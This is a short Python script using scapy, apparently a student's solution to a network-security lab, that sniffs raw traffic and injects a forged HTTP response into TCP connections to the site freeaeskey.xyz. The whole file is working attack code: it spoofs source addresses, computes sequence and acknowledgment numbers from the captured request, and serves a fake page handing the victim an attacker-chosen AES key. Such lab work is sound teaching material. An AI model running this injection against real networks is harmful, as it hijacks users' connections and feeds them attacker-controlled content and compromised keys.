#!/usr/bin/python3

# kone9079
# miha5997

from scapy.all import send, conf, L3RawSocket, Ether, TCP, IP
import scapy


def inject_pkt(pkt):
    #import dnet
    #dnet.ip().send(pkt)
    conf.L3socket=L3RawSocket
    send(pkt)

######
# edit this function to do your attack
######
def handle_pkt(pkt):
    current_pkt = Ether(pkt)
    current_str = str(current_pkt)
    # Looks for GET request to freeaeskey.xyz
    if ('freeaeskey.xyz' in current_str) and ('GET' in current_str):
        # Based on Wireshark packet dump
        insert = 'HTTP/1.1 200 OK\r\nServer: nginx/1.14.0 (Ubuntu)\r\nDate: Wed, 17 Mar 2021 21:17:34 GMT\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: 335\r\nConnection: close\r\n\r\n<html>\n<head>\n  <title>Free AES Key Generator!</title>\n</head>\n<body>\n<h1 style="margin-bottom: 0px">Free AES Key Generator!</h1>\n<span style="font-size: 5%">Definitely not run by the NSA.</span><br/>\n<br/>\n<br/>\nYour <i>free</i> AES-256 key: <b>4d6167696320576f7264733a2053717565616d697368204f7373696672616765</b><br/>\n</body>\n</html>'

        # IP/TCP/DATA
        # Based on Wireshark IP and TCP data from current_pkt (GET request to website)
        attack_pkt = IP(src = current_pkt['IP'].dst, dst = current_pkt['IP'].src) / TCP(ack = current_pkt['TCP'].seq + 117, seq = current_pkt['TCP'].ack, sport = current_pkt['TCP'].dport, dport = current_pkt['TCP'].sport, flags = 0x018) / insert
        # print(current_pkt.show())
        inject_pkt(attack_pkt)



def main():
    import socket
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0300)
    while True:
        pkt = s.recv(0xffff)
        handle_pkt(pkt)
if __name__ == '__main__':
    main()
